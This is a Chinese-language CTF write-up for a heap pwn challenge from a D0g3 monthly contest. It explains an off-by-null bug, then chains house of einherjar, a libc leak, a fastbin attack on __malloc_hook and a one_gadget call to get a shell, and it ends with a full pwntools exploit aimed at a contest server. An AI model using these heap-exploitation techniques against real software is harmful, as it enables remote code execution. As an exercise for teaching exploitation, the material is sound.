# D0g3-19-ein

## 来源

d0g3-19-月赛


## 难度

5  / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

只有4个功能, 添加,删除,查看,退出.保护全开,采用new和delete的方式进行内存管理

## vul

```c
if ( v5 && v5 <= 0xFF )
  {
    plist[i] = operator new[](v5);
    std::operator<<<std::char_traits<char>>((__int64)&std::cout, (__int64)":>");
    for ( j = 0LL; j < v5; ++j )
    {
      read(0, (void *)(plist[i] + j), 1uLL);
      if ( *(_BYTE *)(plist[i] + j) == 10 )
        break;
    }
    *(_BYTE *)(plist[i] + j) = 0;               // off by null
  }
```

目前来看只有 off by null 漏洞可利用...

## 知识点

off by one

unlink

house of einherjar

unsoted bin split

fastbin attack

realloc_hook to ajust stack

one_gadget

## 思路

通过house of einherjar实现堆合并转移,然后通过unsorted bin特性分割堆块,打印获取main_arena + 88地址,通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数



## 利用

### 准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "./libc.so.6"
#libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10002

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sla('>>', str(1))
	sla('???', str(size))
	sa(':>', text)


def rm(idx):
	sla('>>', str(2))
	sla('???', str(idx))

def dp(idx):
	sla('>>', str(3))	
	sla('???', str(idx))

def q():
	sla('>>', str(4))	

```



### 构造堆快布局

```python
	ad(0x80,  'A\n') #idx 0 为了合并
	ad(0x80,  'B\n') #idx 1 为了在合并后,然后分割堆快打印出main_arena
	ad(0x68,  'C\n') #idx 2 为了可以利用fastbin attack 和 off by null
	ad(0xF0,  'D\n') #idx 3 为了使用house of einherjar 合并 chunk 0控制所有堆块
	ad(0x68,  'E\n') #idx 4 了防止top chunk 向前合并
```

### 使用house of einherjar 来合并 chunk 1

```python
	rm(2) #为了使用 off by null 覆盖 chunk3 释放重新开辟
	# use house of einherjar
	p = 'C' * 0x60 
	p += p64(0xda0 - 0xc10) #prev_size = chunk 0 addr - chunk 3 addr
	ad(0x68, p) #使用 off by null 覆盖 chunk 3

	rm(2) #先释放掉进入fastbin中, 后面只需通过溢出修改fd指向我们想要的地方
	# 触发 house of eiherjar
    #避免unlink检查, 先是放掉chunk 0, 这样 chunk0 的fd 和 bk指向的都是main_arena + 88,这样可以绕过unlink检查 FD-bk != P || BK->fd != p
	rm(0) 
	rm(3)  #合并到chunk 0
```

### 泄漏 main_arena 和libc基址

通过分割unsorted bin实现main_arena信息转移,通过开辟0x80内存后, main_arena信息会跑到chunk 1中, 由于我们还对chunk 1没有释放, 直接打印即可获取main_arena + 88 处地址

```python
	# leak main_arena
	ad(0x80, '\n')#分割 unsorted bin, main_arena 会出现在 chunk 1中
	dp()
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	libc_base = main_arena - 0x3c4b20
	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(libc_base))
```

### fastbin attack打入 malloc_hook处

在 malloc_hook -0x23处符合fastbin 的size域.

```
pwndbg> x /40gx (long int)&__malloc_hook - 0x23
0x7f5cc741baed:	0x5cc741a260000000	0x000000000000007f
0x7f5cc741bafd:	0x5cc70dce20000000	0x5cc70dca0000007f
0x7f5cc741bb0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7f5cc741bb1d:	0x0000000000000000	0x0000000000000000
0x7f5cc741bb2d:	0x0000000000000000	0x0000000000000000
0x7f5cc741bb3d:	0x0000000000000000	0x0000000000000000
0x7f5cc741bb4d:	0x6b33cd5d30000000	0x0000000000000055
0x7f5cc741bb5d:	0x0000000000000000	0x0000000000000000
0x7f5cc741bb6d:	0x0000000000000000	0x6b33cd5f10000000
0x7f5cc741bb7d:	0x6b33cd5ca0000055	0x6b33cd5ca0000055
0x7f5cc741bb8d:	0x6b33cd5ca0000055	0x5cc741bb88000055
```

添加chunk1,使大小大于0x80,然后溢出到chunk2,修改chunk2的fd,实现fastbin attack,将fd指向 malloc_hook -0x23

```python
	#通过开辟内存溢出掌控chunk 2, 在fastbin 中chunk 2是我们之前释放的, 现在只需要修改fd指向 malloc_hook -0x23处
   p = 'B' * 0x80
	p += p64(0)
	p += p64(0x71)
	p += p64(main_arena - 0x33)
	p += '\n'
	ad(0xA0, p)
	ad(0x68, '\n') #for ajust fastbin
    
```

### 修改malloc_hook

由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget
#### realloc_hook反汇编
```
pwndbg> disass 0x7fe7cb0ea6c0
Dump of assembler code for function __GI___libc_realloc:
   0x00007fe7cb0ea6c0 <+0>:	push   r15
   0x00007fe7cb0ea6c2 <+2>:	push   r14
   0x00007fe7cb0ea6c4 <+4>:	push   r13
   0x00007fe7cb0ea6c6 <+6>:	push   r12
   0x00007fe7cb0ea6c8 <+8>:	mov    r13,rsi
   0x00007fe7cb0ea6cb <+11>:	push   rbp
   0x00007fe7cb0ea6cc <+12>:	push   rbx
   0x00007fe7cb0ea6cd <+13>:	mov    rbx,rdi
   0x00007fe7cb0ea6d0 <+16>:	sub    rsp,0x38
   0x00007fe7cb0ea6d4 <+20>:	mov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0
   0x00007fe7cb0ea6db <+27>:	mov    rax,QWORD PTR [rax]
   0x00007fe7cb0ea6de <+30>:	test   rax,rax
   0x00007fe7cb0ea6e1 <+33>:	jne    0x7fe7cb0ea8e8 <__GI___libc_realloc+552>
   0x00007fe7cb0ea6e7 <+39>:	test   rsi,rsi
   0x00007fe7cb0ea6ea <+42>:	jne    0x7fe7cb0ea6f5 <__GI___libc_realloc+53>
   0x00007fe7cb0ea6ec <+44>:	test   rdi,rdi

```
通过调试,试出了有一个one_gadget满足execve 第二个参数内容为0的条件

1. realloc_hook =  libc_base + 0xf02a4
2. malloc_hook =  realloc_addr + 12

#### execve执行情况如下

```
0x7fe7cb15715d <exec_comm+2285>    call   execve <0x7fe7cb132770>
path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f /* '/bin/sh' */
argv: 0x7ffe640ad200 ◂— 0x0
envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— 'LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6'
```

#### payload构造如下

```python
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = gadget[2] + libc_base
	realloc_addr = libc_base + lib.sym['realloc']
	li('realloc_addr ' + hex(realloc_addr))

	p = '\x11' * (0x13 - 0x8)
	p += p64(one_gadget)
	p += p64(realloc_addr + 12) #ajust execve second perm as 0
	p += '\n'
	ad(0x68, p)
	
```

## get shell

```python
	# get shell
	sla('>>', '1')
	sl('10')
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "./libc.so.6"
#libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10002

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sla('>>', str(1))
	sla('???', str(size))
	sa(':>', text)


def rm(idx):
	sla('>>', str(2))
	sla('???', str(idx))

def dp(idx):
	sla('>>', str(3))	
	sla('???', str(idx))

def q():
	sla('>>', str(4))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x80,  'A\n') #idx 0
	ad(0x80,  'B\n') #idx 1
	ad(0x68,  'C\n') #idx 2
	ad(0xF0,  'D\n') #idx 3
	ad(0x68,  'E\n') #idx 4

	rm(2)

	p = 'A' * 0x60
	p += p64(0xda0 - 0xc10)
	ad(0x68, p)

	rm(2) #before emerge mem preparing fastbin attack
	# house of einharjar
	rm(0)
	rm(3)

	# show main_arena
	ad(0x80, '\n')
	dp(1)
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	libc_base = main_arena - 0x3c4b20
	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(libc_base))
	
	#fastbin attack to malloc_hook
	p = 'B' * 0x80
	p += p64(0)
	p += p64(0x71)
	p += p64(main_arena - 0x33)
	p += '\n'
	ad(0xA0, p)

	ad(0x68, '\n')
	# modify __malloc_hook as one gadget
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = gadget[2] + libc_base
	realloc_addr = libc_base + lib.sym['realloc']
	li('realloc_addr ' + hex(realloc_addr))

	p = '\x11' * (0x13 - 0x8)
	p += p64(one_gadget)
	p += p64(realloc_addr + 12) #ajust execve second perm as 0
	p += '\n'
	ad(0x68, p)

	# get shell
	sla('>>', '1')
	sl('10')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
```

执行结果:


```
[*] Switching to interactive mode
[DEBUG] Received 0x3 bytes:
    '?' * 0x3
???[DEBUG] Received 0x1 bytes:
    '\n'

$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x23 bytes:
    'flag{^^^___^^^off_by_you_Again!!!}\n'
flag{^^^___^^^off_by_you_Again!!!}
$  

```
